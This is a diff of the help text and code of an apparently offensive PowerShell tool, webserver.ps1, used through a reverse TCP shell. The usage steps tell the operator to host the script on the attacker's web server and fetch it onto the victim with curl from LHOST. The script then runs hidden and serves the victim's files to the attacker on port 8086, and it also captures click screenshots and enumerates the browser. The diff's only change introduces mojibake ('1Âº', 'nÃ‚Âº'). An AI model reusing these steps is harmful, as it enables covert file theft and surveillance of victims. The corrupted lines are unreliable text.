@@ -16,16 +16,16 @@
    to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
    The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)
 
-   1º - Place this cmdlet in attacker apache2 webroot
+   1Âº - Place this cmdlet in attacker apache2 webroot
         cp webserver.ps1 /var/www/html/webserver.ps1
 
-   2º - Upload webserver using the reverse tcp shell prompt
+   2Âº - Upload webserver using the reverse tcp shell prompt
         cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1
 
-   3º - Remote execute webserver using the reverse tcp shell prompt
+   3Âº - Remote execute webserver using the reverse tcp shell prompt
         powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum Verbose
 
-   4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
+   4Âº - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
 
 .NOTES
    If executed with administrator privileges then this cmdlet add's
@@ -714,7 +714,7 @@ $Success = $False ## Python installation status
    #>
 
    ## Loop Function (Social Engineering)
-   # Hint: $i++ increases the nÂº of the $i counter
+   # Hint: $i++ increases the nÃ‚Âº of the $i counter
    Do {
        $check = cmd /c python --version
        ## check target host python version
